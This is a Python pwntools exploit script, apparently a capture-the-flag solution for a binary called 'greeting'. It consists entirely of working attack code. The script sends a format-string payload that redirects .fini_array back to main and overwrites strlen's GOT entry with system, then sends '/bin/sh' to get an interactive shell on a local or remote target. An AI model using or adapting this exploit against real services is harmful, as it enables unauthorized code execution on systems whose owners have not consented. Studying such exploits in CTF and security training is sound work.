#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./greeting"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        set follow-fork-mode parent
		b *main+98
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

fini_array_addr = elf.get_section_by_name(".fini_array").header["sh_addr"]
log.info(".fini_array = 0x{:08x}".format(fini_array_addr))
strlen_got_addr = elf.got['strlen']
log.info("strlen@got = 0x{:08x}".format(strlen_got_addr))
system_plt_addr = elf.plt['system']
log.info("system@plt = 0x{:08x}".format(system_plt_addr))


msg = "Nice to meet you, "
fsb_offset = 12

# GOT Overwrite && Restart main func
payload = b'A' * 2# stack align
payload += p32(fini_array_addr)
payload += p32(strlen_got_addr)
# rewrite .fini_array -> main
payload += "%{}c%{}$hhn".format(0xed - len(payload) - len(msg), fsb_offset).encode()
# rewrite strlen@got -> system@plt
fsb_offset = fsb_offset + 1
payload += "%{}c%{}$n".format(system_plt_addr - 0xed, fsb_offset).encode()
p.recvuntil("Please tell me your name...")
p.sendline(payload)

# Restart main && exec system('/bin/sh')
payload = b'/bin/sh'
p.recvuntil("Please tell me your name...")
p.sendline(payload)

p.interactive()
